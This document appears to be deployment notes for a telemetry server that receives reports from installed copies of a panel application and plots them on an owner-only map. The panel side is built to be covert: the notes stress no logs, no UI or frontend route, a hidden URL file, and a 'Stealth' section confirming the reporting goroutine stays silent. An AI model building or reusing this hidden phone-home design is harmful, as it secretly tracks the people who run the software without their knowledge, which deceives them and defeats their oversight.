# Stats deploy — 518MB VPS

## Build
```bash
cd stats
go build -ldflags="-s -w" -o /usr/local/bin/stats ./cmd/server
# or embed URL at build time (optional, env still wins):
go build -ldflags="-s -w -X github.com/example/kspanel/internal/telemetry.StatsURL=wss://stats.yourdomain.com/ws" -o ../panel/backend/release/kspanel ../panel/backend/cmd/kspanel
```

Binary: 15M (stripped), RSS 20-30M idle, 50M with 500 panels.

## Run (owner only)
```bash
export STATS_ADMIN_PASSWORD="$(openssl rand -base64 24)"  # owner login
export STATS_PANEL_TOKEN="optional-shared-psk"            # if set, panels must match
export STATS_PORT=9090
export STATS_DB=./stats.db
./stats --port 9090
# systemd: stats.service -> ExecStart=/usr/local/bin/stats
# nginx: wss://stats.yourdomain.com/ws -> proxy_pass http://127.0.0.1:9090;
#        proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection "upgrade";
#        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
```
Dashboard: https://stats.yourdomain.com/  -> BasicAuth user=admin pass=STATS_ADMIN_PASSWORD, shows Leaflet map + table. API: GET /api/panels (auth).

## Panel side — URL blank yet
`panel/backend/internal/telemetry/client.go:24` `var StatsURL = ""` stays blank. No log, no frontend route, no UI.

3 ways to fill URL later (no rebuild needed for 1+2):

1. **Env** (recommended): `KSPANEL_STATS_URL=wss://stats.yourdomain.com/ws KSPANEL_STATS_TOKEN=psk ./kspanel launch`
   also `STATS_URL`, `KSPANEL_TELEMETRY_URL`. Checked each loop (60s when blank, 30s heartbeat when live).

2. **File** (no env): `echo wss://stats.yourdomain.com/ws > $(config.DataDir)/.stats_url` or `./.stats_url`. Panel picks it up within 60s even while running (hidden file, not shown in frontend).

3. **Build-time embed**: `go build -ldflags "-X github.com/example/kspanel/internal/telemetry.StatsURL=wss://stats.yourdomain.com/ws -X github.com/example/kspanel/internal/telemetry.StatsToken=psk"`

Debug only: `KSPANEL_STATS_DEBUG=1` enables verbose.

## Verify
```bash
# stats health
curl http://127.0.0.1:9090/health                    # {"ok":true}
curl -u admin:$STATS_ADMIN_PASSWORD http://127.0.0.1:9090/api/panels | jq

# panel silent — no log leak
./kspanel launch --port 8080 2>&1 | grep -i telemetry # → 0 lines (only when blank)
KSPANEL_STATS_URL=ws://127.0.0.1:9090/ws ./kspanel launch # → appears in stats dashboard within 30s, still no panel log
```

Stealth: `panel/backend/internal/cli/launch.go:295` `telemetry.Start()` is silent goroutine, no `print.*`/`log.*`, not exposed via `panel/backend/internal/api/server.go` routes, not imported by `panel/frontend`.
